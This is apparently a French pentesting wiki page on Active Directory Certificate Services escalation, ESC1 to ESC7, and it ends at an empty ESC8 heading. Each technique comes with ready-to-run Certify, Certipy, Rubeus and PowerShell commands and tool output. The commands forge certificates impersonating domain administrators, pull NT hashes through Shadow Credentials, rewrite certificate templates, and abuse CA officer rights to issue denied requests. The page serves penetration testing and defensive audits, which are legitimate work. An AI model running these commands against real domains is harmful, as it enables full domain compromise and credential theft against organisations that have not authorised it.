# Escalade de domaine AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Ceci est un résumé des sections consacrées aux techniques d’escalade dans les articles suivants :**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modèles de certificats mal configurés - ESC1

### Explication

### Explication de la mauvaise configuration des modèles de certificats - ESC1

- **L’Enterprise CA accorde des droits d’inscription à des utilisateurs peu privilégiés.**
- **L’approbation du gestionnaire n’est pas requise.**
- **Aucune signature de personnel autorisé n’est nécessaire.**
- **Les descripteurs de sécurité des modèles de certificats sont trop permissifs, ce qui permet aux utilisateurs peu privilégiés d’obtenir des droits d’inscription.**
- **Les modèles de certificats sont configurés pour définir des EKU facilitant l’authentification :**
  - Des identifiants Extended Key Usage (EKU), tels que Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ou aucune EKU (SubCA), sont inclus.
- **Le modèle autorise les demandeurs à inclure un subjectAltName dans la Certificate Signing Request (CSR) :**
  - Active Directory (AD) donne la priorité au subjectAltName (SAN) d’un certificat pour vérifier l’identité, s’il est présent. Ainsi, en spécifiant le SAN dans une CSR, il est possible de demander un certificat pour usurper l’identité de n’importe quel utilisateur (par exemple, un administrateur de domaine). La possibilité pour le demandeur de spécifier un SAN est indiquée dans l’objet AD du modèle de certificat par la propriété `mspki-certificate-name-flag`. Cette propriété est un masque de bits ; la présence du flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` autorise le demandeur à spécifier le SAN.

> [!CAUTION]
> Ces paramètres identifient un modèle candidat à ESC1, mais ne constituent pas un chemin d’usurpation d’identité complet. Vérifiez que le principal cible peut s’inscrire auprès d’une CA qui publie le modèle, que l’inscription auprès de la CA est autorisée et que le certificat émis respecte les règles strictes de mappage SID du point de terminaison d’authentification. Les KDC actuellement corrigés peuvent rejeter un UPN demandé si le SID du certificat ne correspond pas à celui de la cible ; consultez les [recommandations de Microsoft sur le mappage des certificats](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Les droits d’inscription accordés à **Domain Computers** peuvent rendre un compte machine créé à cette fin admissible, même si l’utilisateur d’origine ne peut pas s’inscrire. Évaluez séparément les droits du principal machine. Vérifiez `msPKI-Minimal-Key-Size` avant d’envoyer une demande : un modèle exigeant des clés RSA de 4096 bits rejettera la clé par défaut de 2048 bits du client. Un SID cible fourni dans la demande ne peut résoudre une incompatibilité de SID que si la CA et le KDC acceptent le certificat obtenu et son mappage ; ni les flags du modèle ni une ACE Enroll ne suffisent à le prouver.

Cette fonctionnalité est parfois activée pour permettre à des produits ou services de déploiement de générer des certificats HTTPS ou d’hôte à la volée, ou par manque de compréhension.

Il est à noter que la création d’un certificat avec cette option déclenche un avertissement, contrairement à la duplication puis à la modification d’un modèle de certificat existant (comme le modèle `WebServer`, pour lequel `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activé) afin d’y inclure un OID d’authentification.<sup>[[6]](#references)</sup>

### Exploitation

Pour **rechercher des modèles de certificats vulnérables**, vous pouvez exécuter :

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Pour **exploiter cette vulnérabilité afin d’usurper l’identité d’un administrateur**, on peut exécuter :

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Ensuite, vous pouvez convertir le **certificat généré au format `.pfx`** et l’utiliser pour **vous authentifier à nouveau à l’aide de Rubeus ou certipy** :<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Les binaires Windows « Certreq.exe » et « Certutil.exe » peuvent être utilisés pour générer le PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L’énumération des modèles de certificats dans le schéma de configuration de la forêt AD, en particulier ceux qui ne nécessitent ni approbation ni signature, qui possèdent un EKU Client Authentication ou Smart Card Logon et dont l’indicateur `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` est activé, peut être effectuée en exécutant la requête LDAP suivante :

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Modèles de certificats mal configurés - ESC2

### Explication

Le deuxième scénario d’abus est une variante du premier :

1. L’Enterprise CA accorde des droits d’inscription à des utilisateurs disposant de faibles privilèges.
2. L’exigence d’approbation du responsable est désactivée.
3. L’exigence de signatures autorisées est omise.
4. Un descripteur de sécurité trop permissif sur le modèle de certificat accorde des droits d’inscription aux utilisateurs disposant de faibles privilèges.
5. **Le modèle de certificat est défini de manière à inclure l’EKU Any Purpose ou aucun EKU.**

L’**EKU Any Purpose** permet à un attaquant d’obtenir un certificat pour **n’importe quelle utilisation**, notamment l’authentification client, l’authentification serveur, la signature de code, etc. La même **technique utilisée pour ESC3** peut être employée pour exploiter ce scénario.

Les certificats **sans EKU**, qui agissent comme des certificats d’autorité de certification subordonnée, peuvent être exploités **à n’importe quelle fin** et peuvent **également servir à signer de nouveaux certificats**. Un attaquant pourrait donc spécifier des EKU ou des champs arbitraires dans les nouveaux certificats en utilisant un certificat d’autorité de certification subordonnée.

Cependant, les nouveaux certificats créés pour l’**authentification de domaine** ne fonctionneront pas si l’autorité de certification subordonnée n’est pas approuvée par l’objet **`NTAuthCertificates`**, ce qui est le paramètre par défaut. Un attaquant peut néanmoins créer de **nouveaux certificats avec n’importe quel EKU** et des valeurs de certificat arbitraires. Ceux-ci pourraient être **exploités** à diverses fins (par exemple, la signature de code, l’authentification serveur, etc.) et avoir des conséquences importantes pour d’autres applications du réseau, comme SAML, AD FS ou IPSec.<sup>[[6]](#references)</sup>

Pour recenser les modèles correspondant à ce scénario dans le schéma de configuration de la forêt AD, la requête LDAP suivante peut être exécutée :

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Modèles d’inscription d’agent mal configurés - ESC3

### Explication

Ce scénario est similaire aux deux premiers, mais **abuse** d’un **EKU différent** (Certificate Request Agent) et de **2 modèles différents** (il comporte donc 2 ensembles de conditions requises).

L’**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), appelé **Enrollment Agent** dans la documentation Microsoft, permet à un principal de **s’inscrire** pour obtenir un **certificat** au **nom d’un autre utilisateur**.

L’**« agent d’inscription »** s’inscrit à un **modèle** de ce type et utilise le **certificat obtenu pour cosigner une CSR au nom de l’autre utilisateur**. Il **envoie** ensuite la **CSR cosignée** à l’AC, s’inscrit à un **modèle** qui **autorise l’inscription « au nom de »**, et l’AC répond avec un **certificat appartenant à l’« autre » utilisateur**.<sup>[[6]](#references)</sup>

**Conditions requises 1 :**

- L’AC d’entreprise accorde des droits d’inscription aux utilisateurs à faibles privilèges.
- L’obligation d’approbation du responsable est omise.
- Aucune signature autorisée n’est requise.
- Le descripteur de sécurité du modèle de certificat est excessivement permissif et accorde des droits d’inscription aux utilisateurs à faibles privilèges.
- Le modèle de certificat inclut l’EKU Certificate Request Agent, permettant de demander d’autres modèles de certificats au nom d’autres principaux.

**Conditions requises 2 :**

- L’AC d’entreprise accorde des droits d’inscription aux utilisateurs à faibles privilèges.
- L’approbation du responsable est contournée.
- Un modèle cible de version 1 peut accepter un agent d’inscription sans les contrôles plus récents et granulaires de stratégie d’émission ; pour la version 2 ou ultérieure, évaluez ses exigences de stratégie d’application et de signatures autorisées au lieu d’exclure le modèle uniquement en fonction de sa version.
- Un EKU défini dans le modèle de certificat autorise l’authentification au domaine.
- Les restrictions visant les agents d’inscription ne sont pas appliquées sur l’AC.

Le modèle cible doit également être publié par l’AC choisie, autoriser le compte cible à s’inscrire et prendre en charge l’usage prévu pour l’authentification au domaine. Vérifiez les attributs subject/SAN requis pour ce compte ; par exemple, un modèle qui construit un sujet à partir de l’adresse e-mail AD ne peut pas émettre de certificat pour un compte dépourvu de la valeur `mail` requise. Un certificat d’agent à lui seul ne satisfait pas ces conditions liées au modèle cible.

### Exploitation

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour exploiter ce scénario :<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Les **utilisateurs** autorisés à **obtenir** un **certificat d’agent d’inscription**, les modèles auxquels les **agents** sont autorisés à s’inscrire et les **comptes** au nom desquels l’agent d’inscription peut agir peuvent être limités par les autorités de certification d’entreprise. Pour cela, ouvrez le composant logiciel enfichable `certsrc.msc`, faites un **clic droit sur l’autorité de certification**, cliquez sur **Propriétés**, puis accédez à l’onglet « Agents d’inscription ».

Il convient toutefois de noter que le paramètre **par défaut** des autorités de certification est « **Ne pas limiter les agents d’inscription** ». Lorsque les administrateurs activent la restriction des agents d’inscription en sélectionnant « Limiter les agents d’inscription », la configuration par défaut reste extrêmement permissive. Elle permet à **Everyone** de s’inscrire à tous les modèles au nom de n’importe qui.

### PoC PowerShell uniquement sous Windows avec Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) met en œuvre ESC1 et ESC2/ESC3 sans Certify ni Certipy. Ses scripts créent une clé RSA exportable de 2048 bits avec l’API COM `X509Enrollment`, construisent une requête PKCS#10, recherchent via LDAP le premier `pKIEnrollmentService`, soumettent la requête à l’aide de `CertificateAuthority.Request`, installent la réponse dans `Cert:\CurrentUser\My` et exportent un PFX encodé en Base64. Le script ESC1 ajoute un SAN UPN choisi par l’attaquant (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, valeur `0xb`), tandis que les scripts ESC2/ESC3 utilisent le premier certificat pour signer une requête PKCS#7 au nom d’un tiers.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Les scripts affichent le Base64 du **PFX**, qui inclut la clé privée, pour une utilisation directe avec Rubeus. Ne le remplacez pas par `[Convert]::ToBase64String($cert.RawData)` : `RawData` encode uniquement le certificat public et ne peut pas signer la requête PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Contrôle d’accès vulnérable aux modèles de certificats - ESC4

### **Explication**

Le **descripteur de sécurité** des **modèles de certificats** définit les **autorisations** dont disposent les **principals AD** sur le modèle.

Si un **attaquant** possède les **autorisations** nécessaires pour **modifier** un **modèle** et **introduire** l’une des **mauvaises configurations exploitables** décrites dans les **sections précédentes**, une escalade de privilèges peut être facilitée.

Les autorisations notables applicables aux modèles de certificats incluent :<sup>[[6]](#references)</sup>

- **Owner :** Accorde un contrôle implicite sur l’objet et permet de modifier n’importe lequel de ses attributs.
- **FullControl :** Accorde une autorité complète sur l’objet, y compris la possibilité de modifier n’importe lequel de ses attributs.
- **WriteOwner :** Permet de remplacer le propriétaire de l’objet par un principal contrôlé par l’attaquant.
- **WriteDacl :** Permet de modifier les contrôles d’accès, ce qui peut accorder FullControl à un attaquant.
- **WriteProperty :** Autorise la modification des propriétés de l’objet.

Examinez également la DACL du conteneur `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Une ACE `CreateChild` applicable et limitée à la classe [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), ou un contrôle total étendu, peut permettre de créer un nouvel objet modèle. [Microsoft indique](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) que ce conteneur héberge ces objets modèles. Examinez les ACE de refus correspondantes et l’héritage avant de déterminer si la création est possible. À lui seul, un modèle créé ne délivre pas de certificat : une CA doit le publier, le principal demandeur doit disposer d’un accès d’inscription et le certificat doit être associé à l’identité visée au niveau du point de terminaison d’authentification.

### Exploitation

Pour identifier les principals disposant de droits de modification sur les modèles et autres objets PKI, effectuez une énumération avec Certify :

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Un exemple de privesc similaire au précédent :

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 se produit lorsqu’un utilisateur dispose de privilèges d’écriture sur un modèle de certificat. Ces privilèges peuvent, par exemple, être exploités pour écraser la configuration du modèle et le rendre vulnérable à ESC1.

Un modèle qui autorise déjà le demandeur à spécifier le sujet, mais dont l’usage se limite à Server Authentication, ne permet pas à lui seul la connexion d’un utilisateur. Avec des droits effectifs de contrôle du modèle, un attaquant pourrait modifier ses EKU d’authentification ou ses stratégies d’application avant de demander un certificat ; [Microsoft documente la fonction de connexion de l’EKU Smartcard Logon](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Vérifiez qu’une CA publie le modèle modifié, que le demandeur peut s’inscrire, que les exigences d’approbation/de signature sont satisfaites et que le certificat délivré est associé au compte visé. En particulier, [les contrôleurs de domaine corrigés en mode Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) rejettent les certificats sans mappage fort ; ajouter l’UPN d’une cible à une demande ne permet pas de contourner cette exigence.

Comme on peut le voir dans le chemin ci-dessus, seul `JOHNPC` dispose de ces privilèges, mais notre utilisateur `JOHN` a désormais une relation `AddKeyCredentialLink` vers `JOHNPC`. Comme cette technique est liée aux certificats, j’ai également implémenté cette attaque, connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Voici un petit aperçu de la commande `shadow auto` de Certipy, qui permet de récupérer le hash NT de la victime.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** peut écraser la configuration d’un modèle de certificat avec une seule commande. Par **défaut**, Certipy écrase la configuration pour la rendre **vulnérable à ESC1**. Nous pouvons également spécifier le paramètre **`-save-old` pour enregistrer l’ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Contrôle d’accès aux objets PKI vulnérables - ESC5

### Explication

Le vaste réseau de relations interconnectées basées sur les ACL, qui comprend plusieurs objets en plus des modèles de certificat et de l’autorité de certification, peut compromettre la sécurité de l’ensemble du système AD CS. Parmi les objets susceptibles d’avoir un impact important sur la sécurité figurent :

- L’objet ordinateur AD du serveur CA, qui peut être compromis au moyen de mécanismes tels que S4U2Self ou S4U2Proxy.
- Le serveur RPC/DCOM du serveur CA.
- Tout objet ou conteneur AD descendant situé dans le chemin de conteneurs spécifique `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ce chemin comprend, entre autres, des conteneurs et objets tels que le conteneur Certificate Templates, le conteneur Certification Authorities, l’objet NTAuthCertificates et le conteneur Enrollment Services.

La sécurité du système PKI peut être compromise si un attaquant disposant de faibles privilèges parvient à prendre le contrôle de l’un de ces composants critiques.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explication

Le sujet abordé dans [**l’article de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) traite également des implications de l’indicateur **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, comme l’explique Microsoft. Lorsque cette configuration est activée sur une autorité de certification (CA), elle permet d’inclure des **valeurs définies par l’utilisateur** dans le **nom alternatif du sujet** pour **toute demande**, y compris celles créées à partir d’Active Directory®. Cette possibilité permet donc à un **intrus** de s’inscrire à l’aide de **n’importe quel modèle** configuré pour l’**authentification** du domaine, notamment ceux qui autorisent l’inscription des utilisateurs **non privilégiés**, comme le modèle User standard. Il est ainsi possible d’obtenir un certificat permettant à l’intrus de s’authentifier en tant qu’administrateur du domaine ou **toute autre entité active** du domaine.<sup>[[9]](#references)</sup>

**Remarque** : La méthode qui consiste à ajouter des **noms alternatifs** à une demande de signature de certificat (CSR) au moyen de l’argument `-attrib "SAN:"` de `certreq.exe` (appelé « Name Value Pairs ») **diffère** de la méthode d’exploitation des SAN dans ESC1. La différence tient à **la manière dont les informations du compte sont encapsulées** : dans un attribut de certificat plutôt que dans une extension.

### Exploitation

Pour vérifier si ce paramètre est activé, les organisations peuvent utiliser la commande suivante avec `certutil.exe` :

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Cette opération utilise essentiellement un **accès au registre distant** ; une autre approche pourrait donc être :

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Des outils comme [**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) sont capables de détecter cette mauvaise configuration et de l’exploiter :<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Pour modifier ces paramètres, à condition de disposer de droits d’administrateur du domaine ou équivalents, la commande suivante peut être exécutée depuis n’importe quel poste de travail :

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Pour désactiver cette configuration dans votre environnement, vous pouvez supprimer l’option avec :

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Après les mises à jour de sécurité de mai 2022, les nouveaux **certificats** émis contiendront une **extension de sécurité** qui intègre la propriété **`objectSid` du demandeur**. Pour ESC1, ce SID est dérivé du SAN spécifié. Cependant, pour **ESC6**, le SID correspond à l’**`objectSid` du demandeur**, et non au SAN.\
> Pour exploiter ESC6, le système doit impérativement être vulnérable à ESC10 (mappages de certificats faibles), qui donne la priorité au **SAN plutôt qu’à la nouvelle extension de sécurité**.

## Contrôle d’accès vulnérable à l’autorité de certification - ESC7

### Attaque 1

#### Explication

Le contrôle d’accès à une autorité de certification est assuré par un ensemble d’autorisations qui régissent les actions de l’AC. Ces autorisations peuvent être consultées en ouvrant `certsrv.msc`, en faisant un clic droit sur une AC, en sélectionnant Propriétés, puis en accédant à l’onglet Sécurité. Les autorisations peuvent également être énumérées à l’aide du module PSPKI avec des commandes telles que :

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This fournit des informations sur les droits principaux, à savoir **`ManageCA`** et **`ManageCertificates`**, qui correspondent respectivement aux rôles d’« administrateur de CA » et de « gestionnaire de certificats ».<sup>[[6]](#references)</sup>

#### Exploitation

Disposer des droits **`ManageCA`** sur une autorité de certification permet au principal de modifier les paramètres à distance à l’aide de PSPKI. Cela inclut l’activation ou la désactivation du flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** afin d’autoriser la spécification du SAN dans n’importe quel modèle, un aspect crucial de l’escalade de privilèges dans le domaine.

Ce processus peut être simplifié à l’aide de la cmdlet **Enable-PolicyModuleFlag** de PSPKI, qui permet d’effectuer des modifications sans interaction directe avec l’interface graphique.

Disposer des droits **`ManageCertificates`** permet d’approuver les demandes en attente, contournant ainsi la protection « approbation du gestionnaire de certificats de la CA ».

La combinaison des modules **Certify** et **PSPKI** permet de demander, d’approuver et de télécharger un certificat :

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attaque 2

#### Explication

> [!WARNING]
> Dans **l’attaque précédente**, les permissions **`Manage CA`** ont été utilisées pour **activer** le flag **EDITF_ATTRIBUTESUBJECTALTNAME2** afin d’effectuer l’**attaque ESC6**, mais cela n’aura aucun effet tant que le service CA (`CertSvc`) n’aura pas été redémarré. Lorsqu’un utilisateur dispose du droit d’accès `Manage CA`, il est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas qu’il peut redémarrer le service à distance**. De plus, l’attaque E**SC6 pourrait ne pas fonctionner d’emblée dans la plupart des environnements corrigés, en raison des mises à jour de sécurité de mai 2022.

Une autre attaque est donc présentée ici.

Prérequis :

- Seule la permission **`ManageCA`**
- La permission **`Manage Certificates`** (peut être accordée depuis **`ManageCA`**)
- Le modèle de certificat **`SubCA`** doit être **activé** (peut être activé depuis **`ManageCA`**)

Cette technique repose sur le fait que les utilisateurs disposant des droits d’accès `Manage CA` _et_ `Manage Certificates` peuvent **délivrer des demandes de certificat ayant échoué**. Le modèle de certificat **`SubCA`** est **vulnérable à ESC1**, mais **seuls les administrateurs** peuvent s’inscrire à ce modèle. Ainsi, un **utilisateur** peut **demander** à s’inscrire au modèle **`SubCA`** — ce qui sera **refusé** — puis la demande sera **délivrée ensuite par le gestionnaire**.<sup>[[6]](#references)</sup>

#### Exploitation

Vous pouvez **vous accorder le droit d’accès `Manage Certificates`** en ajoutant votre utilisateur comme nouvel officier.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Le modèle **`SubCA`** peut être **activé sur la CA** avec le paramètre `-enable-template`. Par défaut, le modèle `SubCA` est activé.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Si nous avons rempli les prérequis de cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette demande sera refusé**e, mais nous enregistrerons la clé privée et noterons l’ID de la demande.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Avec nos droits **`Manage CA` et `Manage Certificates`**, nous pouvons alors **émettre le certificat correspondant à la demande ayant échoué** avec la commande `ca` et le paramètre `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Et enfin, nous pouvons **récupérer le certificat délivré** avec la commande `req` et le paramètre `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attaque 3 – Abus de l’extension Manage Certificates (SetExtension)

#### Explication

En plus des abus classiques d’ESC7 (activation des attributs EDITF ou approbation des demandes en attente), **Certify 2.0** a révélé une nouvelle primitive qui nécessite uniquement le rôle *Manage Certificates* (aussi appelé **Certificate Manager / Officer**) sur l’Enterprise CA.<sup>[[3]](#references)</sup>

La méthode RPC `ICertAdmin::SetExtension` peut être exécutée par tout principal disposant de *Manage Certificates*. Alors que cette méthode était traditionnellement utilisée par les CA légitimes pour mettre à jour les extensions des demandes **en attente**, un attaquant peut en abuser pour **ajouter une extension de certificat *non définie par défaut*** (par exemple, un OID personnalisé de *Certificate Issuance Policy* tel que `1.1.1.1`) à une demande en attente d’approbation.

Comme le template ciblé **ne définit pas de valeur par défaut pour cette extension**, la CA ne remplacera PAS la valeur contrôlée par l’attaquant lors de l’émission de la demande. Le certificat obtenu contient donc une extension choisie par l’attaquant, qui peut :

* Satisfaire aux exigences des stratégies d’application / d’émission d’autres templates vulnérables (et entraîner une élévation de privilèges).
* Injecter des EKU ou des stratégies supplémentaires qui confèrent au certificat une confiance inattendue dans des systèmes tiers.

En bref, *Manage Certificates* – auparavant considéré comme la moitié « la moins puissante » d’ESC7 – peut désormais permettre une élévation complète de privilèges ou une persistance à long terme, sans modifier la configuration de la CA ni nécessiter le droit plus restrictif *Manage CA*.

#### Exploiter cette primitive avec Certify 2.0

1. **Soumettez une demande de certificat qui restera *en attente*.** Cela peut être forcé avec un template qui exige l’approbation d’un responsable :
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Ajouter une extension personnalisée à la requête en attente** à l’aide de la nouvelle commande `manage-ca` :
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Si le modèle ne définit pas déjà l’extension *Certificate Issuance Policies*, la valeur ci-dessus sera conservée après l’émission.*

3. **Émettez la demande** (si votre rôle dispose également des droits d’approbation *Manage Certificates*) ou attendez qu’un opérateur l’approuve. Une fois le certificat émis, téléchargez-le :
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Le certificat obtenu contient désormais l’OID de stratégie d’émission malveillant et peut être utilisé dans des attaques ultérieures (p. ex. ESC13, élévation de privilèges dans le domaine, etc.).

> NOTE : La même attaque peut être exécutée avec Certipy ≥ 4.7 à l’aide de la commande `ca` et du paramètre `-set-extension`.

## Relais NTLM vers les points de terminaison HTTP AD CS – ESC8

### Explication

> [!TIP]
